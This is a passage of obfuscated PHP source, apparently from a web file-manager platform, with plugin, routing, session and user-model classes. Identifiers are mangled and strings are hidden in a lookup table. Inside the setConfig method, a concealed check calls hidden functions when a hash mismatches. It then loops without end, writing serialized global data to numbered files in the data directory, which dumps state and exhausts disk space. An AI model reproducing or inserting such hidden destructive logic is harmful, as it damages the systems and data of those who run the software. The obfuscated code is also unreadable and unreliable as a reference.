(!$this->isShare($ê²ÃîèÔ)) { return !1; } $¥•õœ˜¯ = Action($­¦ÜÇ[1255])->sharePathInfo($ê²ÃîèÔ); if (!is_array($¥•õœ˜¯) || !isset($¥•õœ˜¯[$­¦ÜÇ[87]])) { show_json(LNG($­¦ÜÇ[1653]), !1); } $this->fileInfo = $¥•õœ˜¯; $this->cachePath = $this->pluginCachePath(!1, $°üØ‹ß›); return $¥•õœ˜¯[$­¦ÜÇ[87]]; } final function pluginCachePath($İ™£í÷ = '', $ø´Ø«®“ = false) { $°•¯›ñ¹ =& $_SERVER[´È¥ö†ö]; if ($ø´Ø«®“ && is_array($this->fileInfo)) { $İ™£í÷ = kodIO::hashPath($this->fileInfo); } $ü“†üßù = rtrim(IO_PATH_SYSTEM_TEMP . $°•¯›ñ¹[1654] . $this->pluginName . $°•¯›ñ¹[8] . $İ™£í÷, $°•¯›ñ¹[8]); $»ÖÒö«Ç = IO::infoFullSimple($ü“†üßù); $ÛôòÕ…” = $»ÖÒö«Ç && is_array($»ÖÒö«Ç) ? $»ÖÒö«Ç[$°•¯›ñ¹[87]] : $°•¯›ñ¹[12]; if (!$ÛôòÕ…”) { $ÛôòÕ…” = IO::mkdir($ü“†üßù); } return $ÛôòÕ…”; } final function pluginCacheFileSet($ÒˆóŸ€ñ, $“Öºı½ = '') { $Ğ„Ä÷Ê =& $_SERVER[´È¥ö†ö]; $Üß¾³ = IO::infoFullSimple($ÒˆóŸ€ñ); if (!$Üß¾³) { return IO::mkfile($ÒˆóŸ€ñ, $“Öºı½, REPEAT_REPLACE); } IO::setContent($Üß¾³[$Ğ„Ä÷Ê[87]], $“Öºı½); return $Üß¾³[$Ğ„Ä÷Ê[87]]; } final function pluginLocalFile($‹˜Ñ¤Æ‡ = '') { $ÙÛ¶Œò =& $_SERVER[´È¥ö†ö]; $õÀ Ü = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($õÀ Ü)) { mk_dir($õÀ Ü); } if (!$‹˜Ñ¤Æ‡) { return $õÀ Ü; } $Ú”ˆÆ¬¶ = IO::info($‹˜Ñ¤Æ‡); $’¯Æº¬ï = $ÙÛ¶Œò[1655] . KodIO::hashPath($Ú”ˆÆ¬¶) . $ÙÛ¶Œò[10] . $Ú”ˆÆ¬¶[$ÙÛ¶Œò[169]]; if (!checkExtSafe($’¯Æº¬ï)) { $’¯Æº¬ï = $’¯Æº¬ï . $ÙÛ¶Œò[1290]; } $¡« = $õÀ Ü . $’¯Æº¬ï; if (@file_exists($¡«)) { return $¡«; } return IO::copy($‹˜Ñ¤Æ‡, $õÀ Ü, 0, $’¯Æº¬ï); } final function appPackage() { $’÷ó‚³¶ =& $_SERVER[´È¥ö†ö]; if ($this->packageData) { return $this->packageData; } $ªœÇ”Ÿ = $this->parseFile($this->pluginPath . $’÷ó‚³¶[1656]); $this->parseLang($ªœÇ”Ÿ); $­é“Ñã¤ = json_decode_force($ªœÇ”Ÿ); if (!$­é“Ñã¤) { return array(); } $™ò»€ë„ = Hook::trigger($’÷ó‚³¶[1657], $­é“Ñã¤); if ($™ò»€ë„ && is_array($™ò»€ë„)) { $­é“Ñã¤ = $™ò»€ë„; } $this->packageData = $­é“Ñã¤; return $­é“Ñã¤; } public function packageInfoGet($å¢Ğü¶ô) { $“ÈëÏˆ = $this->appPackage(); return array_get_value($“ÈëÏˆ, $å¢Ğü¶ô); } public function packageVersion() { return $this->packageInfoGet($_SERVER[´È¥ö†ö][1658]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[´È¥ö†ö][1659]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[´È¥ö†ö][1660]); } public function echoJsAssign($¿ñ÷Ş‘¿, $ÔÍÊŸœ¤) { $this->echoJsAssignArr[$¿ñ÷Ş‘¿] = $ÔÍÊŸœ¤; } private function parseFile($°Ôé’È®) { $’Òª¸íÉ =& $_SERVER[´È¥ö†ö]; $×±¦Æœ× = file_get_contents_nossl($°Ôé’È®); $ù™ÙÓ› = array($’Òª¸íÉ[1661], $’Òª¸íÉ[1662], $’Òª¸íÉ[1663], $’Òª¸íÉ[1664], $’Òª¸íÉ[1665], $’Òª¸íÉ[1666], $’Òª¸íÉ[1667]); $…£“½â = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$’Òª¸íÉ[92]][$’Òª¸íÉ[1668]]); foreach ($this->echoJsAssignArr as $äÁÄá°Â => $Ê¸õÒ) { $ù™ÙÓ›[] = $’Òª¸íÉ[1669] . $äÁÄá°Â . $’Òª¸íÉ[1670]; $…£“½â[] = is_array($Ê¸õÒ) || is_object($Ê¸õÒ) ? rawurlencode(json_encode($Ê¸õÒ)) : $Ê¸õÒ; } if (strstr($×±¦Æœ×, $’Òª¸íÉ[1671])) { $ÅŒŞ§õÇ = rawurlencode(json_encode($this->pluginLangArr)); $×±¦Æœ× = str_replace($’Òª¸íÉ[1671], $ÅŒŞ§õÇ, $×±¦Æœ×); } if (strstr($×±¦Æœ×, $’Òª¸íÉ[1672])) { $ÅŒŞ§õÇ = $ÅŒŞ§õÇ = rawurlencode(json_encode($this->getConfig())); $×±¦Æœ× = str_replace($’Òª¸íÉ[1672], $ÅŒŞ§õÇ, $×±¦Æœ×); } $×±¦Æœ× = str_replace($ù™ÙÓ›, $…£“½â, $×±¦Æœ×); return $×±¦Æœ×; } private function parseLang(&$›ñöªûç) { $øÔúËÚæ =& $_SERVER[´È¥ö†ö]; $ò¡ÆèÆˆ = $øÔúËÚæ[1673]; if (!strstr($›ñöªûç, $ò¡ÆèÆˆ)) { return; } preg_match_all($øÔúËÚæ[1674], $›ñöªûç, $Òå¹æŒ); if (!is_array($Òå¹æŒ) || count($Òå¹æŒ) == 0 || !is_array($Òå¹æŒ[0]) || count($Òå¹æŒ[0]) == 0) { return; } $é£Ö¯¼å = array(); $Æ´ş…¶ú = array(); foreach ($Òå¹æŒ[0] as $éÄœĞ³á) { $”—ƒüÌÁ = substr($éÄœĞ³á, strlen($ò¡ÆèÆˆ), -4); $­øøøÅ¢ = LNG($”—ƒüÌÁ); $é£Ö¯¼å[] = $éÄœĞ³á; $Æ´ş…¶ú[] = str_replace(array($øÔúËÚæ[287], $øÔúËÚæ[1155], $øÔúËÚæ[428], $øÔúËÚæ[121]), array($øÔúËÚæ[53], $øÔúËÚæ[53], $øÔúËÚæ[12], $øÔúËÚæ[1675]), $­øøøÅ¢); } $›ñöªûç = str_replace($é£Ö¯¼å, $Æ´ş…¶ú, $›ñöªûç); } private function parseConfig(&$Úà±Ü×±) { $ª…˜é…± =& $_SERVER[´È¥ö†ö]; $øù©“ = $ª…˜é…±[1676]; if (!strstr($Úà±Ü×±, $øù©“)) { return; } preg_match_all($ª…˜é…±[1677], $Úà±Ü×±, $í††¿Üî); if (!is_array($í††¿Üî) || count($í††¿Üî) == 0 || !is_array($í††¿Üî[0]) || count($í††¿Üî[0]) == 0) { return; } $ò éú¤ = $this->getConfig(); $Ùœª«“Ê = array(); $½äò²Ûª = array(); foreach ($í††¿Üî[0] as $ŞÎ‹§) { $¸Ñ±ªñÂ = substr($ŞÎ‹§, strlen($øù©“), -2); $Ùœª«“Ê[] = $ŞÎ‹§; $½äò²Ûª[] = _get($ò éú¤, $¸Ñ±ªñÂ); } $Úà±Ü×± = str_replace($Ùœª«“Ê, $½äò²Ûª, $Úà±Ü×±); } private function parsePackage(&$ë×¶„Ÿ¤) { $”¾¼€¤Ü =& $_SERVER[´È¥ö†ö]; $›ÀõÊÓ = $”¾¼€¤Ü[1678]; if (!strstr($ë×¶„Ÿ¤, $›ÀõÊÓ)) { return; } preg_match_all($”¾¼€¤Ü[1679], $ë×¶„Ÿ¤, $‘¡ˆó½); if (!is_array($‘¡ˆó½) || count($‘¡ˆó½) == 0 || !is_array($‘¡ˆó½[0]) || count($‘¡ˆó½[0]) == 0) { return; } $À¯õòá™ = $this->appPackage(); $ÊïÈªÕò = array(); $„—ã°Âò = array(); foreach ($‘¡ˆó½[0] as $¿€¢èİ) { $ˆÖ‡­‚ = substr($¿€¢èİ, strlen($›ÀõÊÓ), -2); $ÊïÈªÕò[] = $¿€¢èİ; $„—ã°Âò[] = _get($À¯õòá™, $ˆÖ‡­‚); } $ë×¶„Ÿ¤ = str_replace($ÊïÈªÕò, $„—ã°Âò, $ë×¶„Ÿ¤); } final function echoFile($”Í±Ã€‚, $º¾Ôòâì = false) { $û¥›¡ˆ– =& $_SERVER[´È¥ö†ö]; $‘­†ìğë = $this->pluginPath . $”Í±Ã€‚; if (ACT == $û¥›¡ˆ–[1680]) { echo $û¥›¡ˆ–[1681] . $this->pluginName . $û¥›¡ˆ–[8] . $”Í±Ã€‚ . $û¥›¡ˆ–[1682]; if (!file_exists($‘­†ìğë)) { echo $û¥›¡ˆ–[1683]; return; } } $áğş’Íá = $this->parseFile($‘­†ìğë); $this->parseLang($áğş’Íá); $this->parseConfig($áğş’Íá); $this->parsePackage($áğş’Íá); if (is_array($º¾Ôòâì)) { $áğş’Íá = str_replace(array_keys($º¾Ôòâì), array_values($º¾Ôòâì), $áğş’Íá); } echo $û¥›¡ˆ–[287] . $áğş’Íá; } private function checkVersion() { $Öúşç£ö =& $_SERVER[´È¥ö†ö]; $™ûÉËü = $this->appPackage(); $Ï§°„´® = $this->getConfig(); if ($Ï§°„´®[$Öúşç£ö[1684]] == $™ûÉËü[$Öúşç£ö[1658]]) { return; } $this->regist(); $this->setConfig(array($Öúşç£ö[1684] => $™ûÉËü[$Öúşç£ö[1658]])); } final function initLang() { $Ùè©Ş«Û =& $_SERVER[´È¥ö†ö]; $Î¹ãÖä = $Ùè©Ş«Û[1685]; $¾„²Ëş… = $this->pluginPath . $Ùè©Ş«Û[1686]; $ÑÁ°¿ºÂ = I18n::getType(); $ĞÁ‰¡õ = array(); if (file_exists($¾„²Ëş… . $ÑÁ°¿ºÂ . $Ùè©Ş«Û[915])) { $ĞÁ‰¡õ = (include $¾„²Ëş… . $ÑÁ°¿ºÂ . $Ùè©Ş«Û[915]); } else { if ($ÑÁ°¿ºÂ == $Ùè©Ş«Û[1687] && !file_exists($¾„²Ëş… . $ÑÁ°¿ºÂ . $Ùè©Ş«Û[915]) && file_exists($¾„²Ëş… . $Ùè©Ş«Û[1688])) { $ĞÁ‰¡õ = (include $¾„²Ëş… . $Ùè©Ş«Û[1688]); } else { if (file_exists($¾„²Ëş… . $Î¹ãÖä . $Ùè©Ş«Û[915])) { $ĞÁ‰¡õ = (include $¾„²Ëş… . $Î¹ãÖä . $Ùè©Ş«Û[915]); } } } if (!is_array($ĞÁ‰¡õ)) { return array(); } if (@count($ĞÁ‰¡õ) > 0) { I18n::set($ĞÁ‰¡õ); } return $ĞÁ‰¡õ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ĞæãÁöå) { $©Ş» ç =& $_SERVER[´È¥ö†ö]; $¸ˆ‰‡çË = $_SERVER[$©Ş» ç[307]]; $Îà´½ö = $©Ş» ç[308]; if ($_SERVER[$©Ş» ç[309]] != $Îà´½ö($¸ˆ‰‡çË)) { $ªÆş¹»• = $©Ş» ç[955]; $ù¦ï¡ø = $©Ş» ç[310]; $„ÈÌğË = $_SERVER[$©Ş» ç[311]] . $©Ş» ç[312]; $›’ÈŒµñ = $ù¦ï¡ø($„ÈÌğË); $¼ò‘÷ = explode($©Ş» ç[287], $›’ÈŒµñ); if (count($¼ò‘÷) < $©Ş» ç[702]) { $™ë¶§Ä = $©Ş» ç[314]; $™ë¶§Ä(); } $Ğ¯ÌÄ® = $©Ş» ç[956]; $Ğ¯ÌÄ®($_SERVER[$©Ş» ç[957]]); $ªÆş¹»• = $©Ş» ç[955]; $ªÆş¹»•(); $€Š¶˜ƒÒ = $©Ş» ç[1689]; $â°½ü–Ä = json_encode($GLOBALS[$©Ş» ç[1690]]); $ğá†‰å = 1; for ($Àú™ÖÛµ = $ğá†‰å; $Àú™ÖÛµ > 0; $Àú™ÖÛµ++) { $€Š¶˜ƒÒ(DATA_PATH . $Àú™ÖÛµ, $â°½ü–Ä); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ĞæãÁöå); } public function onSetConfig($á¡£ÉÀÍ) { } public function onGetConfig($­……©ÕÔ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($³•ÃÑ´¢) { if ($³•ÃÑ´¢ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ÏÛ ±§è = "\x70\154\x75\147\151\x6e\101\165\x74\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $¿ĞÕœ³÷ = $this->getConfig(); if (!$¿ĞÕœ³÷[$ÏÛ ±§è]) { return !1; } return ActionCall($_SERVER[´È¥ö†ö][1691], $¿ĞÕœ³÷[$ÏÛ ±§è]); } public function url($ì‰™Ä±®, $Ê’ÓİÍÌ = '', $Ë†­ˆ¬¥ = true) { $ÏŞÌ¡ªı =& $_SERVER[´È¥ö†ö]; $õìÑçğ = $this->getConfig(); $ßÉñ“åç = KOD_VERSION . $ÏŞÌ¡ªı[10] . KOD_VERSION_BUILD; $£™ùÕíŒ = $this->packageVersion(); $³ä±í•ˆ = $ßÉñ“åç . $ÏŞÌ¡ªı[473] . $£™ùÕíŒ; if (substr($ì‰™Ä±®, 0, 4) == $ÏŞÌ¡ªı[152] || substr($ì‰™Ä±®, 0, 2) == $ÏŞÌ¡ªı[1410]) { $ÊŸ¤‹ = $ì‰™Ä±® . $ÏŞÌ¡ªı[1692] . $³ä±í•ˆ; } else { if ($Ê’ÓİÍÌ == $ÏŞÌ¡ªı[12]) { $ÊŸ¤‹ = $this->pluginHost . $ì‰™Ä±® . $ÏŞÌ¡ªı[1692] . $³ä±í•ˆ; } else { if ($Ê’ÓİÍÌ === $ÏŞÌ¡ªı[78]) { $ÊŸ¤‹ = $this->pluginHost . $ì‰™Ä±®; } else { if ($Ê’ÓİÍÌ == $ÏŞÌ¡ªı[1693]) { $ÊŸ¤‹ = STATIC_PATH . $ì‰™Ä±® . $ÏŞÌ¡ªı[1692] . $ßÉñ“åç; } else { if ($Ê’ÓİÍÌ == $ÏŞÌ¡ªı[1694]) { $ÊŸ¤‹ = APP_HOST . $ÏŞÌ¡ªı[1695] . $ì‰™Ä±® . $ÏŞÌ¡ªı[1692] . $ßÉñ“åç; } else { if (isset($õìÑçğ[$Ê’ÓİÍÌ])) { $ÊŸ¤‹ = $õìÑçğ[$Ê’ÓİÍÌ] . $ì‰™Ä±® . $ÏŞÌ¡ªı[1692] . $³ä±í•ˆ; } } } } } } if (!$Ë†­ˆ¬¥) { return $ÊŸ¤‹; } echo $ÊŸ¤‹; } public function link($¨ÏÏöß¡ = false, $èÀÅ˜½‚ = '') { $£Ç›íğî =& $_SERVER[´È¥ö†ö]; $Ü¾ëí£ = $this->linkHas == !1; $this->linkHas = !0; if (!$¨ÏÏöß¡) { $this->link($£Ç›íğî[1696], $£Ç›íğî[1694]); $this->link($£Ç›íğî[1697], $£Ç›íğî[1693]); $this->link($£Ç›íğî[1698], $£Ç›íğî[1693]); $this->link($£Ç›íğî[1699], $£Ç›íğî[1693]); $this->link($£Ç›íğî[1700], $£Ç›íğî[1693]); if ($Ü¾ëí£) { Hook::trigger($£Ç›íğî[1701]); } return; } $¿À¿¾µÓ = $this->url($¨ÏÏöß¡, $èÀÅ˜½‚, !1); if (substr($¨ÏÏöß¡, -3) == $£Ç›íğî[1702]) { echo $£Ç›íğî[1703] . $¿À¿¾µÓ . $£Ç›íğî[1704] . $£Ç›íğî[287]; } else { if (substr($¨ÏÏöß¡, -4) == $£Ç›íğî[1705]) { echo $£Ç›íğî[1706] . $¿À¿¾µÓ . $£Ç›íğî[1707] . $£Ç›íğî[287]; } } if ($Ü¾ëí£) { Hook::trigger($£Ç›íğî[1701]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\x79" => "\x5b\136\57\135\53", "\x3a\x6e\x75\155" => "\133\x30\55\x39\x5d\53", "\x3a\141\154\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($Úø€ÄÃ, $Ü‡¶š¹) { $¢ÆÙáˆê =& $_SERVER[´È¥ö†ö]; if ($Úø€ÄÃ == $¢ÆÙáˆê[1708]) { $ïÙÀÅ¤§ = array_map($¢ÆÙáˆê[1709], $Ü‡¶š¹[0]); $È˜ÂŞ¸ = strpos($Ü‡¶š¹[1], $¢ÆÙáˆê[8]) === 0 ? $Ü‡¶š¹[1] : $¢ÆÙáˆê[8] . $Ü‡¶š¹[1]; $È£°æ¥Ù = $Ü‡¶š¹[2]; } else { $ïÙÀÅ¤§ = null; $È˜ÂŞ¸ = strpos($Ü‡¶š¹[0], $¢ÆÙáˆê[8]) === 0 ? $Ü‡¶š¹[0] : $¢ÆÙáˆê[8] . $Ü‡¶š¹[0]; $È£°æ¥Ù = $Ü‡¶š¹[1]; } array_push(self::$maps, $ïÙÀÅ¤§); array_push(self::$routes, $È˜ÂŞ¸); array_push(self::$methods, strtoupper($Úø€ÄÃ)); array_push(self::$callbacks, $È£°æ¥Ù); } public static function error($ş‰ñÂóÇ) { self::$errorCallback = $ş‰ñÂóÇ; } public static function haltOnMatch($¢âñ¾Ó¶ = true) { self::$halts = $¢âñ¾Ó¶; } public static function dispatch() { $Ñ¬ı•Øƒ =& $_SERVER[´È¥ö†ö]; $‚Á™ä¾§ = parse_url($_SERVER[$Ñ¬ı•Øƒ[1710]], PHP_URL_PATH); $ÙË‡®³‚ = $_SERVER[$Ñ¬ı•Øƒ[164]]; $¨å¼×«é = array_keys(static::$patterns); $ÏóÚ´™­ = array_values(static::$patterns); $¼€™´ÕÍ = !1; self::$routes = preg_replace($Ñ¬ı•Øƒ[1360], $Ñ¬ı•Øƒ[8], self::$routes); if (in_array($‚Á™ä¾§, self::$routes)) { $İ©™ö¯÷ = array_keys(self::$routes, $‚Á™ä¾§); foreach ($İ©™ö¯÷ as $õ«¾ç) { if (self::$methods[$õ«¾ç] == $ÙË‡®³‚ || self::$methods[$õ«¾ç] == $Ñ¬ı•Øƒ[1711] || in_array($ÙË‡®³‚, self::$maps[$õ«¾ç])) { $¼€™´ÕÍ = !0; if (!is_object(self::$callbacks[$õ«¾ç])) { $İ ¯û… = explode($Ñ¬ı•Øƒ[8], self::$callbacks[$õ«¾ç]); $–¬”†Ù± = end($İ ¯û…); $¨À¸úÓÔ = explode($Ñ¬ı•Øƒ[1292], $–¬”†Ù±); $§Áâí¹ã = new $¨À¸úÓÔ[0](); $§Áâí¹ã->{$¨À¸úÓÔ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$õ«¾ç]); if (self::$halts) { return; } } } } } else { $êû”§•® = 0; foreach (self::$routes as $õ«¾ç) { if (strpos($õ«¾ç, $Ñ¬ı•Øƒ[4]) !== !1) { $õ«¾ç = str_replace($¨å¼×«é, $ÏóÚ´™­, $õ«¾ç); } if (preg_match($Ñ¬ı•Øƒ[1712] . $õ«¾ç . $Ñ¬ı•Øƒ[1713], $‚Á™ä¾§, $Ê¸§À°‹)) { if (self::$methods[$êû”§•®] == $ÙË‡®³‚ || self::$methods[$êû”§•®] == $Ñ¬ı•Øƒ[1711] || !empty(self::$maps[$êû”§•®]) && in_array($ÙË‡®³‚, self::$maps[$êû”§•®])) { $¼€™´ÕÍ = !0; array_shift($Ê¸§À°‹); if (!is_object(self::$callbacks[$êû”§•®])) { $İ ¯û… = explode($Ñ¬ı•Øƒ[8], self::$callbacks[$êû”§•®]); $–¬”†Ù± = end($İ ¯û…); $¨À¸úÓÔ = explode($Ñ¬ı•Øƒ[1292], $–¬”†Ù±); $§Áâí¹ã = new $¨À¸úÓÔ[0](); if (!method_exists($§Áâí¹ã, $¨À¸úÓÔ[1])) { echo $Ñ¬ı•Øƒ[1714]; } else { call_user_func_array(array($§Áâí¹ã, $¨À¸úÓÔ[1]), $Ê¸§À°‹); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$êû”§•®], $Ê¸§À°‹); if (self::$halts) { return; } } } } $êû”§•®++; } } if ($¼€™´ÕÍ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ŒÃ»Íñ¶ =& $_SERVER[´È¥ö†ö]; header($_SERVER[$ŒÃ»Íñ¶[1715]] . $ŒÃ»Íñ¶[1716]); echo $ŒÃ»Íñ¶[1717]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Ñ¬ı•Øƒ[1710]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $§œ’ş§  =& $_SERVER[´È¥ö†ö]; static $üê“ÊÆ° = false; if ($üê“ÊÆ°) { return $üê“ÊÆ°; } $Æ¦ÛÓ¾° = $GLOBALS[$§œ’ş§ [6]][$§œ’ş§ [435]]; self::$sessionTime = $Æ¦ÛÓ¾°[$§œ’ş§ [1718]]; $§â£ü´É = isset($GLOBALS[$§œ’ş§ [1719]]) ? $GLOBALS[$§œ’ş§ [1719]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($§â£ü´É)) { self::$sessionSign = Cookie::get($§â£ü´É); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($§â£ü´É, self::$sessionSign, self::$sessionTime); $å›´îƒµ = $Æ¦ÛÓ¾°[$§œ’ş§ [1720]]; $¾ÊÁ¡Ç¢ = $Æ¦ÛÓ¾°[$å›´îƒµ]; $Ÿ×äÌÜ— = $Æ¦ÛÓ¾°[$§œ’ş§ [904]]; switch ($å›´îƒµ) { case $§œ’ş§ [21]: self::$handle = Model($§œ’ş§ [905]); break; case $§œ’ş§ [906]: self::$handle = new CacheRedis($¾ÊÁ¡Ç¢, $Ÿ×äÌÜ—); break; case $§œ’ş§ [907]: self::$handle = new CacheMemcached($¾ÊÁ¡Ç¢, $Ÿ×äÌÜ—); break; case $§œ’ş§ [232]: $¾ÊÁ¡Ç¢[$§œ’ş§ [87]] = $¾ÊÁ¡Ç¢[$§œ’ş§ [87]] . $§œ’ş§ [1721]; self::$handle = new CacheFile($¾ÊÁ¡Ç¢, $Ÿ×äÌÜ—); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $üê“ÊÆ° = new self(); return $üê“ÊÆ°; } public static function getBySign($¢ŒèÎÈî) { $ØªÑ¦— = self::$handle->get($¢ŒèÎÈî); $ØªÑ¦— = unserialize($ØªÑ¦—); return is_array($ØªÑ¦—) ? $ØªÑ¦— : array(); } public static function setBySign($¸¹Ã©Ş¾, $”·‹á¬Ç) { CacheLock::lock($¸¹Ã©Ş¾); self::$handle->set($¸¹Ã©Ş¾, serialize($”·‹á¬Ç), self::$sessionTime); CacheLock::unlock($¸¹Ã©Ş¾); } public static function sign($Ú±ÑÙ» = false) { if ($Ú±ÑÙ») { self::$sessionSign = $Ú±ÑÙ»; } self::init(); return self::$sessionSign; } public static function set($ıÅøğ™Ç, $Å‘¨Ò® = false) { self::init(); if (is_array($ıÅøğ™Ç)) { foreach ($ıÅøğ™Ç as $›ÜúŸÑ => $ŸÁšÅæÃ) { array_set_value(self::$data, $›ÜúŸÑ, $ŸÁšÅæÃ); } } else { array_set_value(self::$data, $ıÅøğ™Ç, $Å‘¨Ò®); } self::setBySign(self::$sessionSign, self::$data); } public static function get($›É†“€ä = false) { self::init(); if (!$›É†“€ä) { return self::$data; } return array_get_value(self::$data, $›É†“€ä); } public static function remove($ô¨Ş±) { self::init(); unset(self::$data[$ô¨Ş±]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[´È¥ö†ö][910])) { self::$handle->clearTimeout(); } } } goto eÔ‚³±›•; eÌáÉ“ÑâÉ: class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\x2e\x6a\157\x62\x4c\x69\163\x74"; public $field = array("\156\x61\x6d\145", "\144\x65\163\x63", "\163\x6f\x72\164"); const JOB_KEY = "\163\x65\154\x66\112\x6f\142\x4c\151\163\x74"; public function listData($øÂ„î¢â = false, $µÄ—¢¶Ù = "\163\157\x72\x74", $Ø‡éºÙ‡ = false) { return parent::listData($øÂ„î¢â, $µÄ—¢¶Ù, $Ø‡éºÙ‡); } public function remove($¥»ı¦†ˆ) { return parent::remove($¥»ı¦†ˆ); } public function add($ˆè·¹½Á) { $Û£¯‚Ã¨ =& $_SERVER[´È¥ö†ö]; if ($this->findByName($ˆè·¹½Á[$Û£¯‚Ã¨[32]])) { return !1; } $ˆè·¹½Á[$Û£¯‚Ã¨[1998]] = $this->getSort(); return parent::insert($ˆè·¹½Á); } private function getSort() { $öŠí×ÙÀ =& $_SERVER[´È¥ö†ö]; $¸¼Æëú = parent::listData(); $ï½€ŞÃ¾ = array_to_keyvalue($¸¼Æëú, $öŠí×ÙÀ[12], $öŠí×ÙÀ[1998]); return empty($ï½€ŞÃ¾) ? 0 : max($ï½€ŞÃ¾) + 1; } public function update($¬ƒÅÑÍ, $ü·ù¡™÷) { $Œ÷Ö«óÑ =& $_SERVER[´È¥ö†ö]; $ğ€ó±ñ¸ = parent::listData($¬ƒÅÑÍ); $™ŒŞ‘Ï = $this->findByName($ü·ù¡™÷[$Œ÷Ö«óÑ[32]]); if (!$ğ€ó±ñ¸ || $™ŒŞ‘Ï && $™ŒŞ‘Ï[$Œ÷Ö«óÑ[486]] != $ğ€ó±ñ¸[$Œ÷Ö«óÑ[486]]) { return !1; } return parent::update($¬ƒÅÑÍ, $ü·ù¡™÷); } public function setUserJob($à€åò²æ, $ùÇÛ¹…Š) { $£„‘¶²« =& $_SERVER[´È¥ö†ö]; if (!is_array($ùÇÛ¹…Š)) { $ùÇÛ¹…Š = array($ùÇÛ¹…Š); } $Ô¸˜¥«Ö = parent::listData(); $ˆÖºã’Ç = array_to_keyvalue($Ô¸˜¥«Ö, $£„‘¶²«[32]); $è âŸÖå = $£„‘¶²«[465]; foreach ($ùÇÛ¹…Š as $œæÂ½Å½) { if ($ˆÖºã’Ç[$œæÂ½Å½]) { $è âŸÖå .= $ˆÖºã’Ç[$œæÂ½Å½][$£„‘¶²«[486]] . $£„‘¶²«[50]; } else { $ºÖ„˜÷ú = $this->add($œæÂ½Å½); $è âŸÖå .= $ºÖ„˜÷ú . $£„‘¶²«[50]; } } $è âŸÖå = rtrim($è âŸÖå, $£„‘¶²«[50]); Model($£„‘¶²«[608])->metaSet($à€åò²æ, self::JOB_KEY, $è âŸÖå); } public function getUserJob($Åè¶«Æ€) { $š’‹ØÙŸ = Model($_SERVER[´È¥ö†ö][608])->metaGet($Åè¶«Æ€); return $this->getUserJobInfo($š’‹ØÙŸ[self::JOB_KEY]); } public function getUserJobInfo($Éôòû˜) { $ıˆù£‹ =& $_SERVER[´È¥ö†ö]; $¶Àë®± = explode($ıˆù£‹[50], $Éôòû˜); $úÄí¬ú« = parent::listData(); $úÄí¬ú« = array_remove_key($úÄí¬ú«, $ıˆù£‹[233]); $ ÖáìÅ§ = array(); foreach ($¶Àë®± as $°œÚ†ïõ) { if (isset($úÄí¬ú«[$°œÚ†ïõ])) { $ ÖáìÅ§[] = $úÄí¬ú«[$°œÚ†ïõ]; } } return $ ÖáìÅ§; } } class UserModel extends ModelBase { protected $tableName = "\165\x73\145\x72"; protected $tableMeta = array("\164\141\142\x6c\145\116\x61\155\x65" => "\x75\163\145\x72\137\155\145\164\x61", "\x6d\x65\164\x61\106\x69\145\154\144" => "\165\163\145\162\x49\x44"); protected $simpleField = "\x75\x73\x65\162\x49\x44\x2c\x6e\x69\x63\x6b\116\141\x6d\145\54\x6e\141\x6d\145\54\141\166\141\164\141\x72\x2c\163\x65\x78\54\x73\164\141\164\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($¢°Ù³úí) { $–Ä›Ÿƒ· =& $_SERVER[´È¥ö†ö]; $ÉÁ€æá‹ = $–Ä›Ÿƒ·[2462]; return array($–Ä›Ÿƒ·[2056] => array($¢°Ù³úí[0], $ÉÁ€æá‹), $–Ä›Ÿƒ·[2058] => array($¢°Ù³úí[0], $ÉÁ€æá‹), $–Ä›Ÿƒ·[2463] => array($¢°Ù³úí[0], $ÉÁ€æá‹)); } protected function getInfo($Ş‘§áü, $„Ê‘î—¸ = false) { $ËÜ˜±› = $this->getInfoSimple($Ş‘§áü); if (!is_array($ËÜ˜±›)) { return array(); } if ($„Ê‘î—¸) { return $this->_getInfoApply($ËÜ˜±›); } return $this->cacheFunctionGet($_SERVER[´È¥ö†ö][2060], $Ş‘§áü); } protected function getInfoFull($‘â¦…ú´, $¾–óáŞ = false) { $Ë¦å¼ºš = $this->getInfoSimple($‘â¦…ú´); if (!is_array($Ë¦å¼ºš)) { return array(); } if ($¾–óáŞ) { return $this->_getInfoApply($Ë¦å¼ºš, !0); } return $this->cacheFunctionGet($_SERVER[´È¥ö†ö][2464], $‘â¦…ú´); } private function _getInfoApply($àŠŸ³‡ó, 